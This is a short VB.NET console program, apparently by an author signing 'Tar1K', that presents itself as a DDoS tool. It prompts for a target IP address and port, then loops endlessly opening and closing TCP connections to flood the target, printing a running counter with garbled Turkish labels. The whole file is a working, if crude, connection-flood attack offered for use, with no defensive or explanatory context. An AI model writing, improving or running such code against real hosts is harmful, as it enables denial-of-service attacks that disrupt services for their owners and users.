Imports System.Net
Imports System.Net.Sockets
Module Module1

    Sub Main()

        Console.ForegroundColor = ConsoleColor.Red
        Console.Title = "Tar1K Hacking DDoS ~ |JR|"
        Console.WriteLine("                                [ Tar1K Ddos]                                  ")
        Console.ForegroundColor = ConsoleColor.DarkGray
        Console.WriteLine("================================================================================")
        Console.WriteLine("                            => { Coder Tar1K } <=                            ")
        Console.WriteLine("                          ==>     { Sürüm : 0.2.5.23 }    <==                          ")
        Console.WriteLine("================================================================================")
        Console.ForegroundColor = ConsoleColor.Green
        Console.WriteLine("Web or Ip adress : ")
        Dim ip As String = Console.ReadLine
        Console.WriteLine("Port (Def 80) :")
        Dim porta As Integer = Console.ReadLine
        Dim x As Integer
        Do
            Try
                Dim iep As IPEndPoint
                iep = New IPEndPoint(IPAddress.Parse(ip), Convert.ToInt32(porta))
                Dim s As Socket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                s.Connect(iep)
                s.Close()
                x += 1

                Console.WriteLine("Yüklenen Að Aþýmý </Tar1K>:  " & x)
            Catch ex As Exception
                Console.ForegroundColor = ConsoleColor.Red
                Console.WriteLine("Yüklenen Að Aþýmý </Tar1K>:  " & x)
            End Try
        Loop
    End Sub
End Module